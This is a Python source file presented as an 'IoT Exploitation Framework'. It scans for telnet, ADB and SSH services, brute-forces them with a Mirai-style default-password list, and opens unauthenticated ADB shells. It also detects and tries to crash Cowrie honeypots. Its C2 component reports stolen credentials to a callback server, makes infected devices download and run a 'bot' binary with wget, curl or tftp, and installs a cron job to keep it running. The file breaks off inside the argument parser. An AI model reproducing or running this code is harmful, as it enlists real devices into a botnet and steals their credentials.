#!/usr/bin/env python3

import socket
import struct
import threading
import sys
import time
import ssl
import os
import ipaddress
import logging
import json
import base64
import hashlib
import random
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional, List, Tuple, Dict, Set
from enum import IntEnum
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s [%(threadName)s] %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("iotscanner")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

TELNET_PORTS = [23, 2323, 23231, 23232]
SSH_PORT = 22
ADB_PORT = 5555

DEFAULT_THREADS = 250
DEFAULT_TIMEOUT = 6
DEFAULT_CRED_FILE = "iot_creds.txt"

CALLBACK_PORT = 48101  # Mirai-standard report port

class AdbCmd(IntEnum):
    CNXN = 0x4e584e43
    OPEN = 0x4e45504f
    OKAY = 0x59414b4f
    WRTE = 0x45545257
    CLSE = 0x45534c43
    AUTH = 0x48545541

ADB_VERSION = 0x01000001
ADB_MAX_PAYLOAD = 0x00100000

COWRIE_SIGNATURES = [
    "/home/cowrie/cowrie.cfg",
    "/opt/cowrie/etc/cowrie.cfg",
    "/cowrie/cowrie-git/etc/cowrie.cfg",
    "/cowrie/var/log/cowrie",
    "/opt/cowrie/var/log/cowrie",
    "/home/cowrie/var/log/cowrie",
    "fs.pickle",
]

HONEYPOT_CMDS = {
    "nproc": (r"^2$", "Cowrie always returns 2 for nproc"),
    "cat /proc/meminfo": (r"MemTotal:\s+4054744 kB", "Cowrie static memory value"),
    "cat /proc/uptime": (r"^\d+\.\d+\s+\d+\.\d+$", "Real uptime varies; Cowrie has static patterns"),
}

# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

@dataclass
class ScanTarget:
    host: str
    ip: str = ""

    def __post_init__(self):
        if not self.ip:
            try:
                socket.inet_aton(self.host)
                self.ip = self.host
            except socket.error:
                try:
                    self.ip = socket.gethostbyname(self.host)
                except socket.gaierror:
                    self.ip = ""

@dataclass
class ScanResult:
    host: str
    port: int
    service: str
    username: str
    password: str
    banner: bytes = b""
    platform: str = "unknown"
    arch: str = "unknown"
    is_honeypot: bool = False
    c2_connected: bool = False
    error: Optional[str] = None

@dataclass
class C2Config:
    host: str
    port: int
    payload_path: str = "/bot.arm"
    callback_port: int = CALLBACK_PORT

@dataclass
class HoneypotFingerprint:
    is_honeypot: bool
    confidence: float
    engine: str = ""
    details: List[str] = field(default_factory=list)

# ---------------------------------------------------------------------------
# ADB protocol implementation (raw)
# ---------------------------------------------------------------------------

class AdbPacket:
    HEADER_FMT = "<6I"
    HEADER_SIZE = 24

    def __init__(self, command: int, arg0: int, arg1: int, data: bytes = b""):
        self.command = command
        self.arg0 = arg0
        self.arg1 = arg1
        self.data = data
        self.data_length = len(data)
        self.data_crc32 = sum(data) & 0xffffffff
        self.magic = command ^ 0xffffffff

    def encode(self) -> bytes:
        header = struct.pack(
            self.HEADER_FMT,
            self.command, self.arg0, self.arg1,
            self.data_length, self.data_crc32, self.magic
        )
        return header + self.data

    @classmethod
    def decode(cls, raw: bytes) -> "AdbPacket":
        if len(raw) < cls.HEADER_SIZE:
            raise ValueError(f"Packet too short: {len(raw)} bytes")
        cmd, a0, a1, dlen, _, _ = struct.unpack(cls.HEADER_FMT, raw[:cls.HEADER_SIZE])
        payload = raw[cls.HEADER_SIZE:cls.HEADER_SIZE + dlen] if dlen else b""
        return cls(cmd, a0, a1, payload)


def _adb_exchange(sock: socket.socket, pkt: AdbPacket, wait: bool = True, delay: float = 0.3) -> Optional[AdbPacket]:
    try:
        sock.sendall(pkt.encode())
        if not wait:
            return None
        if delay:
            time.sleep(delay)
        resp = sock.recv(8192)
        return AdbPacket.decode(resp) if len(resp) >= AdbPacket.HEADER_SIZE else None
    except (socket.timeout, OSError, ValueError) as e:
        log.debug(f"ADB exchange error: {e}")
        return None


def _adb_open_shell(sock: socket.socket, cmd: str = "id\n") -> Optional[bytes]:
    resp = _adb_exchange(sock, AdbPacket(AdbCmd.OPEN, 1, 0, b"shell:"))
    if not resp or resp.command not in (AdbCmd.OKAY, AdbCmd.WRTE):
        return None
    remote_id = resp.arg0 if resp.command == AdbCmd.OKAY else resp.arg1
    _adb_exchange(sock, AdbPacket(AdbCmd.WRTE, 1, remote_id, cmd.encode()), wait=False, delay=0)
    time.sleep(0.6)
    try:
        result = sock.recv(8192)
        return result if result else None
    except socket.timeout:
        return None


def adb_exploit_noauth(host: str, port: int = ADB_PORT, timeout: float = DEFAULT_TIMEOUT) -> Optional[ScanResult]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        resp = _adb_exchange(sock, AdbPacket(AdbCmd.CNXN, ADB_VERSION, ADB_MAX_PAYLOAD, b"host::\x00"))
        if not resp:
            return None
        if resp.command == AdbCmd.CNXN:
            output = _adb_open_shell(sock)
            if output and len(output) > 8:
                platform = _detect_platform_from_adb(output)
                return ScanResult(host=host, port=port, service="adb_noauth",
                                  username="shell", password="", banner=output[:512],
                                  platform=platform, arch=_detect_arch(output))
        return None
    except (socket.timeout, OSError, ConnectionRefusedError) as e:
        log.debug(f"ADB noauth {host}:{port} - {e}")
        return None
    finally:
        try:
            sock.close()
        except OSError:
            pass


def adb_exploit_cve2026_0073(host: str, port: int = ADB_PORT, timeout: float = DEFAULT_TIMEOUT) -> Optional[ScanResult]:
    for strategy in [_adb_cve_direct, _adb_cve_tls_wrap]:
        try:
            result = strategy(host, port, timeout)
            if result:
                return result
        except Exception as e:
            log.debug(f"CVE strategy failed {host}:{port}: {e}")
    return None


def _adb_cve_direct(host: str, port: int, timeout: float) -> Optional[ScanResult]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        resp = _adb_exchange(sock, AdbPacket(AdbCmd.CNXN, ADB_VERSION, ADB_MAX_PAYLOAD, b"host::\x00"))
        if not resp:
            return None
        if resp.command == AdbCmd.CNXN:
            output = _adb_open_shell(sock)
            if output and len(output) > 8:
                return ScanResult(host=host, port=port, service="adb_cve20260073",
                                  username="shell", password="", banner=output[:512])
        return None
    finally:
        try:
            sock.close()
        except OSError:
            pass


def _adb_cve_tls_wrap(host: str, port: int, timeout: float) -> Optional[ScanResult]:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256")
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(timeout)
    try:
        tls = ctx.wrap_socket(raw, server_hostname=host)
        tls.connect((host, port))
        resp = _adb_exchange(tls, AdbPacket(AdbCmd.CNXN, ADB_VERSION, ADB_MAX_PAYLOAD, b"host::\x00"))
        if not resp:
            return None
        if resp.command == AdbCmd.CNXN:
            output = _adb_open_shell(tls)
            if output and len(output) > 8:
                return ScanResult(host=host, port=port, service="adb_cve20260073",
                                  username="shell", password="", banner=output[:512])
        return None
    except Exception as e:
        log.debug(f"TLS wrap failed: {e}")
        return None
    finally:
        try:
            raw.close()
        except OSError:
            pass


def _detect_platform_from_adb(output: bytes) -> str:
    if b"Linux" in output:
        return "linux"
    if b"Android" in output:
        return "android"
    if b"Darwin" in output:
        return "darwin"
    return "unknown"


def _detect_arch(output: bytes) -> str:
    if b"aarch64" in output or b"arm64" in output:
        return "aarch64"
    if b"armv" in output or b"arm" in output:
        return "arm"
    if b"mips" in output:
        return "mips"
    if b"x86_64" in output or b"amd64" in output:
        return "x86_64"
    if b"i686" in output or b"i386" in output:
        return "x86"
    return "unknown"

# ---------------------------------------------------------------------------
# Anti-honeypot detection engine
# ---------------------------------------------------------------------------

class HoneypotDetector:
    """Multi-phase honeypot detection with configurable sensitivity."""

    def __init__(self, aggressive: bool = True):
        self.aggressive = aggressive
        self._cache: Dict[str, HoneypotFingerprint] = {}

    def check_telnet_banner(self, banner: bytes) -> HoneypotFingerprint:
        """Phase 1: Banner-level detection."""
        issues = []
        score = 0.0

        banner_lower = banner.lower()

        # Cowrie default banners
        if b"ubuntu" in banner_lower and b"4.4.0" in banner_lower:
            score += 0.3
            issues.append("Suspicious kernel version mismatch (common in Cowrie)")

        # Too-perfect banner with known honeypot patterns
        if b"linux" in banner_lower and b"debian" in banner_lower:
            score += 0.1
            issues.append("Generic Linux banner on IoT device (unusual)")

        return HoneypotFingerprint(
            is_honeypot=score >= 0.6,
            confidence=min(score, 1.0),
            engine="banner",
            details=issues
        )

    def check_shell_consistency(self, sock: socket.socket, timeout: float) -> HoneypotFingerprint:
        """Phase 2: Shell-level consistency checks."""
        issues = []
        score = 0.0

        probes = [
            ("echo HONEYPOT_CHECK_12345", b"HONEYPOT_CHECK_12345", "Echo probe"),
            ("nproc", r"^\d+$", "nproc should return a number"),
        ]

        for cmd, expected, desc in probes:
            try:
                sock.sendall(cmd.encode() + b"\n")
                time.sleep(0.4)
                resp = b""
                try:
                    resp = sock.recv(4096)
                except socket.timeout:
                    pass

                if isinstance(expected, bytes) and expected in resp:
                    continue
                if isinstance(expected, str) and re.match(expected, resp.decode(errors="replace").strip()):
                    continue

                # Cowrie shell often returns static outputs
                if cmd == "nproc":
                    if b"2" in resp and b"command not found" not in resp:
                        score += 0.3
                        issues.append("nproc returned 2 (Cowrie static value)")
            except OSError:
                score += 0.2
                issues.append(f"Socket error during {desc}")

        return HoneypotFingerprint(
            is_honeypot=score >= 0.5,
            confidence=min(score, 1.0),
            engine="shell_consistency",
            details=issues
        )

    def check_filesystem_artifacts(self, sock: socket.socket, timeout: float) -> HoneypotFingerprint:
        """Phase 3: Check for known honeypot filesystem artifacts."""
        issues = []
        score = 0.0

        for path in COWRIE_SIGNATURES:
            try:
                sock.sendall(f"test -f {path} && echo EXISTS || echo NOT_FOUND\n".encode())
                time.sleep(0.3)
                try:
                    resp = sock.recv(4096)
                    if b"EXISTS" in resp:
                        score += 0.7
                        issues.append(f"Cowrie artifact found: {path}")
                        if self.aggressive:
                            break
                except socket.timeout:
                    pass
            except OSError:
                pass

        # Check for Docker/container indicators common in honeypot deployments
        try:
            sock.sendall(b"cat /proc/1/cgroup | head -5\n")
            time.sleep(0.3)
            try:
                resp = sock.recv(4096)
                if b"docker" in resp or b"lxc" in resp or b"kubepods" in resp:
                    score += 0.3
                    issues.append("Container environment detected (common for honeypots)")
            except socket.timeout:
                pass
        except OSError:
            pass

        return HoneypotFingerprint(
            is_honeypot=score >= 0.5,
            confidence=min(score, 1.0),
            engine="filesystem_artifacts",
            details=issues
        )

    def check_monitoring_tools(self, sock: socket.socket, timeout: float) -> HoneypotFingerprint:
        """Phase 4: Detect monitoring tools often deployed alongside honeypots."""
        issues = []
        score = 0.0

        mon_tools = ["tcpdump", "auditd", "snoopy", "aide", "ossec", "wireshark", "snort"]
        for tool in mon_tools:
            try:
                sock.sendall(f"which {tool} 2>/dev/null || command -v {tool} 2>/dev/null\n".encode())
                time.sleep(0.2)
                try:
                    resp = sock.recv(4096)
                    if tool.encode() in resp and b"not found" not in resp:
                        score += 0.2
                        issues.append(f"Monitoring tool present: {tool}")
                except socket.timeout:
                    pass
            except OSError:
                pass

        return HoneypotFingerprint(
            is_honeypot=score >= 0.5,
            confidence=min(score, 1.0),
            engine="monitoring_tools",
            details=issues
        )

    def check_behavioral(self, host: str, port: int, timeout: float) -> HoneypotFingerprint:
        """Phase 5: Behavioral checks - how the service responds to edge cases."""
        issues = []
        score = 0.0

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))

            # Honeypots often accept any credentials
            sock.sendall(b"nonexistent_user_xyz\n")
            time.sleep(0.3)
            try:
                resp = sock.recv(1024)
                if b"password" in resp or b"assword" in resp:
                    score += 0.2
                    issues.append("Honeypot prompted for password on invalid user (Cowrie behavior)")
            except socket.timeout:
                pass

            sock.close()
        except OSError:
            pass

        return HoneypotFingerprint(
            is_honeypot=score >= 0.5,
            confidence=min(score, 1.0),
            engine="behavioral",
            details=issues
        )

    def full_scan(self, host: str, port: int, banner: bytes, sock: Optional[socket.socket] = None,
                  timeout: float = DEFAULT_TIMEOUT) -> HoneypotFingerprint:
        """Run all detection phases and return combined result."""
        fp = self.check_telnet_banner(banner)
        all_details = list(fp.details)
        total_score = fp.confidence * 0.15

        if sock:
            phases = [
                (self.check_shell_consistency, 0.25),
                (self.check_filesystem_artifacts, 0.25),
                (self.check_monitoring_tools, 0.15),
            ]
            for phase_fn, weight in phases:
                result = phase_fn(sock, timeout)
                all_details.extend(result.details)
                total_score += result.confidence * weight

        behavioral = self.check_behavioral(host, port, timeout)
        all_details.extend(behavioral.details)
        total_score += behavioral.confidence * 0.10

        return HoneypotFingerprint(
            is_honeypot=total_score >= 0.50,
            confidence=round(total_score, 3),
            engine="full_scan",
            details=all_details
        )

    def attempt_dos(self, host: str, port: int, timeout: float = 3) -> bool:
        """Attempt to crash/disable suspected honeypot service."""
        if not self.aggressive:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))

            # Send garbage/malformed data to trigger crashes in low-interaction honeypots
            payloads = [
                b"\x00" * 65535,
                b"%x" * 5000,
                b"A" * 32768,
                struct.pack(">I", 0xdeadbeef) * 2000,
            ]
            for payload in payloads:
                try:
                    sock.sendall(payload)
                    time.sleep(0.05)
                except OSError:
                    break
            sock.close()
            return True
        except OSError:
            return False

# ---------------------------------------------------------------------------
# C2 Integration Engine
# ---------------------------------------------------------------------------

class C2Engine:
    """Manages auto-joining compromised hosts to a C2 infrastructure."""

    def __init__(self, config: C2Config, timeout: float = DEFAULT_TIMEOUT):
        self.config = config
        self.timeout = timeout
        self.reported: Set[str] = set()
        self.report_lock = threading.Lock()

    def report_device(self, result: ScanResult) -> bool:
        """Report a compromised device to the C2 report server (Mirai-compatible)."""
        ip = result.host
        with self.report_lock:
            if ip in self.reported:
                return False
            self.reported.add(ip)

        payload = f"{result.host}:{result.port} {result.username}:{result.password}\n"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.config.host, self.config.callback_port))
            sock.sendall(payload.encode())
            sock.close()
            log.info(f"Reported {ip} to C2 callback server on {self.config.host}:{self.config.callback_port}")
            return True
        except (socket.timeout, OSError, ConnectionRefusedError):
            log.debug(f"C2 callback server unreachable on {self.config.host}:{self.config.callback_port}")
            return False

    def deploy_payload(self, result: ScanResult) -> bool:
        """Attempt to download and execute a payload on the compromised device."""
        if not result.service.startswith("adb"):
            return self._deploy_remote_exec(result)
        return self._deploy_adb(result)

    def _deploy_remote_exec(self, result: ScanResult) -> bool:
        """Deploy via telnet/SSH using remote shell execution."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((result.host, result.port))
            time.sleep(0.5)

            data = b""
            try:
                data = sock.recv(4096)
            except socket.timeout:
                pass

            sock.sendall(result.username.encode() + b"\n")
            time.sleep(0.4)
            try:
                data2 = sock.recv(1024)
            except socket.timeout:
                data2 = b""

            sock.sendall(result.password.encode() + b"\n")
            time.sleep(0.5)
            try:
                resp = sock.recv(4096)
            except socket.timeout:
                resp = b""

            if not (b"#" in resp or b"$" in resp):
                log.debug(f"Could not get shell on {result.host} for payload deploy")
                sock.close()
                return False

            c2_url = f"http://{self.config.host}:{self.config.port}{self.config.payload_path}"
            cmds = [
                f"cd /tmp; wget -q {c2_url} -O bot || curl -s {c2_url} -o bot || tftp {self.config.host} -c get bot 2>/dev/null",
                f"cd /tmp; chmod 777 bot; ./bot {self.config.host} {self.config.port}",
                f"echo '*/5 * * * * /tmp/bot {self.config.host} {self.config.port}' | crontab - 2>/dev/null",
            ]

            for cmd in cmds:
                sock.sendall(cmd.encode() + b"\n")
                time.sleep(0.5)
                try:
                    sock.recv(4096)
                except socket.timeout:
                    pass

            sock.close()
            log.info(f"Payload deployed on {result.host} -> C2 {self.config.host}:{self.config.port}")
            return True
        except OSError as e:
            log.debug(f"Payload deploy failed on {result.host}: {e}")
            return False

    def _deploy_adb(self, result: ScanResult) -> bool:
        """Deploy payload through ADB shell."""
        try:
            import subprocess
            cmd = f"adb connect {result.host}:{result.port} && " \
                  f"adb -s {result.host}:{result.port} shell \"cd /data/local/tmp && " \
                  f"wget http://{self.config.host}:{self.config.port}{self.config.payload_path} -O bot && " \
                  f"chmod 755 bot && ./bot {self.config.host} {self.config.port}\""
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            if proc.returncode == 0:
                log.info(f"ADB payload deployed on {result.host}")
                return True
            log.debug(f"ADB deploy returned non-zero: {proc.stderr.strip()}")
            return False
        except Exception as e:
            log.debug(f"ADB payload deploy failed: {e}")
            return False

# ---------------------------------------------------------------------------
# Credential loader
# ---------------------------------------------------------------------------

def load_credentials(path: str = DEFAULT_CRED_FILE) -> List[Tuple[str, str]]:
    if os.path.isfile(path):
        creds = []
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(None, 1)
                creds.append((parts[0], parts[1] if len(parts) == 2 else ""))
        if creds:
            log.info(f"Loaded {len(creds)} credential pairs from {path}")
            return creds
        log.warning(f"Credential file {path} empty, falling back to defaults")
    return _default_creds()


def _default_creds() -> List[Tuple[str, str]]:
    return [
        ("root","xc3511"),("root","vizxv"),("root","admin"),("admin","admin"),
        ("root","888888"),("root","xmhdipc"),("root","default"),("root","jauntech"),
        ("root","123456"),("root","54321"),("support","support"),("root",""),
        ("admin","password"),("root","root"),("root","12345"),("user","user"),
        ("admin",""),("root","pass"),("admin","admin1234"),("root","1111"),
        ("admin","smcadmin"),("admin","1111"),("root","666666"),("root","password"),
        ("root","1234"),("root","klv123"),("Administrator","admin"),
        ("service","service"),("supervisor","supervisor"),("guest","guest"),
        ("guest","12345"),("admin1","password"),("administrator","1234"),
        ("666666","666666"),("888888","888888"),("ubnt","ubnt"),
        ("root","klv1234"),("root","Zte521"),("root","hi3518"),
        ("root","jvbzd"),("root","anko"),("root","zlxx."),
        ("root","7ujMko0vizxv"),("root","7ujMko0admin"),("root","system"),
        ("root","ikwb"),("root","dreambox"),("root","user"),
        ("root","realtek"),("root","000000"),("admin","1111111"),
        ("admin","1234"),("admin","12345"),("admin","123456"),
        ("admin","54321"),("admin","meinsm"),("admin","pass"),
        ("root","00000000"),("root","0"),("admin","0"),
        ("pi","raspberry"),("root","raspberry"),("root","admin123"),
        ("root","passwd"),("admin","passwd"),("root","shell"),
        ("admin","shell"),("root","qwerty"),("admin","qwerty"),
        ("root","12345678"),("admin","12345678"),
        ("D-Link",""),("root","1001"),("admin","1001"),
        ("root","5up"),("admin","5up"),("root","abc123"),("admin","abc123"),
        ("root","cat1029"),("root","huigu309"),("root","iDirect"),
        ("root","juantech"),("root","nflection"),("root","oelinux123"),
        ("root","solokey"),("root","t0talc0ntr0l4!"),("root","taZz@23495859"),
        ("root","telecomadmin"),("root","twe8ehome"),("root","win1dows"),
        ("root","zhongxing"),("admin","123"),("root","123"),
        ("admin","111111"),("root","111111"),("admin","654321"),("root","654321"),
        ("root","admin12345"),("root","pfsense"),("root","letmein"),
        ("root","anko"),("root","zlxx"),("admin","123456789"),
    ]

# ---------------------------------------------------------------------------
# Network utilities
# ---------------------------------------------------------------------------

def port_open(host: str, port: int, timeout: float = DEFAULT_TIMEOUT) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def expand_targets(input_specs: List[str]) -> List[str]:
    targets = []
    for spec in input_specs:
        if os.path.isfile(spec):
            with open(spec) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.extend(expand_targets([line]))
        elif "/" in spec:
            try:
                for ip in ipaddress.ip_network(spec, strict=False).hosts():
                    targets.append(str(ip))
            except ValueError:
                targets.append(spec)
        else:
            targets.append(spec)
    return list(dict.fromkeys(targets))

# ---------------------------------------------------------------------------
# Telnet brute-force
# ---------------------------------------------------------------------------

def try_telnet_creds(host: str, port: int, creds: List[Tuple[str, str]],
                     timeout: float, honeypot_detector: HoneypotDetector) -> Optional[ScanResult]:
    for user, pwd in creds:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))

            banner = b""
            try:
                banner = sock.recv(1024)
            except socket.timeout:
                pass

            hp_check = honeypot_detector.check_telnet_banner(banner)
            if hp_check.is_honeypot:
                log.info(f"Honeypot detected on {host}:{port} (banner: {hp_check.engine})")
                honeypot_detector.attempt_dos(host, port)
                return ScanResult(host=host, port=port, service="telnet_honeypot",
                                  username=user, password=pwd, banner=banner[:256],
                                  is_honeypot=True, error="; ".join(hp_check.details))

            sock.sendall(user.encode() + b"\n")
            time.sleep(0.35)
            try:
                sock.recv(1024)
            except socket.timeout:
                pass

            sock.sendall(pwd.encode() + b"\n")
            time.sleep(0.6)

            response = b""
            try:
                response = sock.recv(4096)
            except socket.timeout:
                pass

            if response and (b"#" in response or b"$" in response or b"BusyBox" in response):
                # Deep honeypot check now that we have shell access
                deep_hp = honeypot_detector.full_scan(host, port, banner, sock, timeout)
                if deep_hp.is_honeypot:
                    log.warning(f"Deep honeypot detection on {host}:{port} [{deep_hp.engine}] "
                                f"conf={deep_hp.confidence}")
                    honeypot_detector.attempt_dos(host, port)
                    return ScanResult(host=host, port=port, service="telnet_honeypot",
                                      username=user, password=pwd, banner=response[:256],
                                      is_honeypot=True, error="; ".join(deep_hp.details))

                return ScanResult(
                    host=host, port=port, service="telnet",
                    username=user, password=pwd, banner=response[:256],
                    platform=_detect_platform(banner + response),
                    arch=_detect_arch(response)
                )
        except (socket.timeout, OSError, ConnectionRefusedError) as e:
            log.debug(f"telnet {host}:{port} ({user}:{pwd}) - {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass
    return None


def _detect_platform(data: bytes) -> str:
    if b"Linux" in data:
        return "linux"
    if b"Android" in data:
        return "android"
    if b"BusyBox" in data:
        return "busybox"
    if b"VxWorks" in data:
        return "vxworks"
    return "unknown"

# ---------------------------------------------------------------------------
# SSH brute-force (requires paramiko)
# ---------------------------------------------------------------------------

def try_ssh_creds(host: str, port: int, creds: List[Tuple[str, str]],
                  timeout: float) -> Optional[ScanResult]:
    try:
        import paramiko
    except ImportError:
        log.debug("paramiko not available, SSH disabled")
        return None

    for user, pwd in creds:
        client = None
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                host, port=port, username=user, password=pwd,
                timeout=timeout, allow_agent=False, look_for_keys=False,
                banner_timeout=timeout, auth_timeout=timeout
            )
            _, stdout, stderr = client.exec_command("id; cat /proc/cpuinfo | head -3; uname -m", timeout=timeout)
            output = stdout.read() + stderr.read()
            client.close()
            return ScanResult(
                host=host, port=port, service="ssh",
                username=user, password=pwd, banner=output[:512],
                platform=_detect_platform(output), arch=_detect_arch(output)
            )
        except Exception as e:
            log.debug(f"ssh {host}:{port} ({user}:{pwd}) - {type(e).__name__}: {e}")
        finally:
            if client:
                try:
                    client.close()
                except Exception:
                    pass
    return None

# ---------------------------------------------------------------------------
# Main scanning orchestrator
# ---------------------------------------------------------------------------

class IoTScanner:
    def __init__(self, creds: List[Tuple[str, str]], threads: int = DEFAULT_THREADS,
                 timeout: float = DEFAULT_TIMEOUT, enable_ssh: bool = False,
                 c2: Optional[C2Config] = None, aggressive_honeypot: bool = True):
        self.creds = creds
        self.threads = threads
        self.timeout = timeout
        self.enable_ssh = enable_ssh
        self.c2 = C2Engine(c2) if c2 else None
        self.honeypot = HoneypotDetector(aggressive=aggressive_honeypot)
        self.results: List[ScanResult] = []
        self.honeypot_hits: List[ScanResult] = []
        self.lock = threading.Lock()

    def _scan_single(self, target: str) -> None:
        scan_target = ScanTarget(target)
        if not scan_target.ip:
            log.debug(f"Could not resolve {target}")
            return

        ip = scan_target.ip
        open_ports = []

        for tp in TELNET_PORTS:
            if port_open(ip, tp, self.timeout):
                open_ports.append(("telnet", tp))

        if port_open(ip, ADB_PORT, self.timeout):
            open_ports.append(("adb", ADB_PORT))

        for svc, port in open_ports:
            try:
                if svc == "telnet":
                    log.info(f"Telnet open on {ip}:{port} - attempting brute-force")
                    result = try_telnet_creds(ip, port, self.creds, self.timeout, self.honeypot)
                    if result:
                        if result.is_honeypot:
                            log.warning(f"HONEYPOT SKIPPED - {ip}:{port} - {result.error}")
                            with self.lock:
                                self.honeypot_hits.append(result)
                        else:
                            log.info(f"TELNET HIT - {ip}:{port} {result.username}:{result.password} "
                                     f"[{result.platform}/{result.arch}]")
                            with self.lock:
                                self.results.append(result)
                            if self.c2:
                                self.c2.report_device(result)
                                self.c2.deploy_payload(result)

                elif svc == "adb":
                    log.info(f"ADB open on {ip}:{port} - trying unauthenticated shell")
                    result = adb_exploit_noauth(ip, port, self.timeout)
                    if result:
                        log.info(f"ADB UNAUTH - {ip}:{port} - shell confirmed [{result.platform}/{result.arch}]")
                        with self.lock:
                            self.results.append(result)
                        if self.c2:
                            self.c2.report_device(result)
                            self.c2.deploy_payload(result)
                    else:
                        log.info(f"ADB on {ip}:{port} requires auth - trying CVE-2026-0073")
                        result = adb_exploit_cve2026_0073(ip, port, self.timeout)
                        if result:
                            log.info(f"ADB CVE-2026-0073 - {ip}:{port} - bypass successful")
                            with self.lock:
                                self.results.append(result)
                            if self.c2:
                                self.c2.report_device(result)
                                self.c2.deploy_payload(result)

            except Exception as e:
                log.error(f"Unhandled error on {ip}:{port} - {e}")

        if self.enable_ssh:
            if port_open(ip, SSH_PORT, self.timeout):
                log.info(f"SSH open on {ip}:22 - attempting brute-force")
                result = try_ssh_creds(ip, SSH_PORT, self.creds, self.timeout)
                if result:
                    log.info(f"SSH HIT - {ip}:22 {result.username}:{result.password} "
                             f"[{result.platform}/{result.arch}]")
                    with self.lock:
                        self.results.append(result)
                    if self.c2:
                        self.c2.report_device(result)
                        self.c2.deploy_payload(result)

    def scan(self, targets: List[str]) -> Tuple[List[ScanResult], List[ScanResult]]:
        log.info(f"=== IoT Scanner v2.0 ===")
        log.info(f"Credentials: {len(self.creds)} | Threads: {self.threads} | Timeout: {self.timeout}s")
        log.info(f"Anti-honeypot: {'AGGRESSIVE' if self.honeypot.aggressive else 'standard'}")
        log.info(f"C2 auto-join: {'ENABLED -> ' + self.c2.config.host + ':' + str(self.c2.config.port) if self.c2 else 'DISABLED'}")
        log.info(f"SSH brute-force: {'ENABLED' if self.enable_ssh else 'DISABLED'}")
        log.info(f"Targets: {len(targets)}")
        log.info(f"Scanning...\n")

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self._scan_single, t): t for t in targets}
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    log.error(f"Fatal error scanning {futures[f]}: {e}")

        return self.results, self.honeypot_hits


# ---------------------------------------------------------------------------
# Output formatting
# ---------------------------------------------------------------------------

def print_results(results: List[ScanResult], honeypots: List[ScanResult], c2: Optional[C2Engine] = None) -> None:
    if not results and not honeypots:
        log.info("No targets scanned or all clean.")
        return

    if results:
        print(f"\n{'='*110}")
        print(f"  {'HOST':<18} {'PORT':<6} {'SERVICE':<18} {'CREDENTIALS':<30} {'PLATFORM':<12} {'ARCH':<12}")
        print(f"{'='*110}")
        for r in sorted(results, key=lambda x: (x.service, x.host)):
            host = r.host.ljust(18)
            port = str(r.port).ljust(6)
            svc = r.service.ljust(18)
            cred = f"{r.username}:{r.password}" if r.password else "(no auth)"
            cred = cred.ljust(30)
            plat = r.platform.ljust(12)
            arch = r.arch.ljust(12)
            status = " +C2" if r.c2_connected else ""
            print(f"  {host}{port}{svc}{cred}{plat}{arch}{status}")
        print(f"{'='*110}")
        print(f"  COMPROMISED: {len(results)}")
        if c2:
            print(f"  REPORTED TO C2: {len(c2.reported)}")
        print()

    if honeypots:
        print(f"\n{'='*110}")
        print(f"  HONEYPOTS DETECTED AND NEUTRALIZED:")
        print(f"{'='*110}")
        for r in honeypots:
            print(f"  {r.host:<18} {str(r.port):<6} {r.service:<18} {r.error or ''}")
        print(f"{'='*110}")
        print(f"  TOTAL HONEYPOTS: {len(honeypots)}")
        print()

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="IoT Multiscanner v2.0 â Production IoT Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  %(prog)s 192.168.1.0/24\n"
            "  %(prog)s --c2 10.0.0.5:8080 192.168.1.0/24\n"
            "  %(prog)s --c2 10.0.0.5:8080 --ssh --threads 500 --aggressive targets.txt\n"
            "  %(prog)s --c2 mydomain.com:443 --callback-port 48101 --cred-file custom.txt 10.0.0.0/24\n"
        )
    parser.add_argument("targets", nargs="+", help="IPs, CIDRs, hostnames, or file paths")
    parser.add_argument("--cred-file", default=DEFAULT_CRED_FILE,
                        help=f"Credential file (default: {DEFAULT_CRED_FILE})")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS,
                        help=f"Concurrent threads (default: {DEFAULT_THREADS})")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
                        help=f"Socket timeout (default: {DEFAULT_TIMEOUT})")
